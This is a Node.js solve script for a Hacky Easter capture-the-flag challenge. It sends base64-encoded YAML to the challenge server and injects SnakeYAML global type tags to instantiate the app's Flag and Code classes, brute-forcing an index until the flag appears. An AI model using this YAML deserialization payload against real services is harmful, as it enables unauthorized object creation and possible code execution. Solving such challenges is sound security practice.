import fetch from 'node-fetch';

const url = 'http://ch.hackyeaster.com:2307/art?art=';

const originalPayload = `
name: Snake as a Super Hero
image: snake_as_a_super_hero
source: DALL-E
resolution: 256x256`;

const packageName = 'com.hackyeaster.digitalsnakeart'

async function doOneFetch(payload) {
    const payloadBase64 = Buffer.from(payload).toString('base64')
    const fullUrl = `${url}${payloadBase64}`;
    const data = await fetch(fullUrl)
    const text = await data.text();
    return text;
}

async function run() {
    let found = false;
    let iterator = 1;
    const totalIterations = 500;

    while(!found && iterator < totalIterations) {
        console.log('Iteration', iterator);
        const payload = `
name: Snake as a flag
image: !!${packageName}.Flag [!!${packageName}.Code [${iterator}]]
source: DALL-ME
resolution: 256x256
`;
        const result = await doOneFetch(payload);

        if (!result.includes(`1mcOf4B8pgFYl0GYSgHe2ggmgACAQcCga24d/jf/P33BbJDcFKoBnWf3PSW/Huw`)) {
            found = true;
            console.log('FOUND--', iterator, result);
        }

        iterator += 1;
    }
}

run()

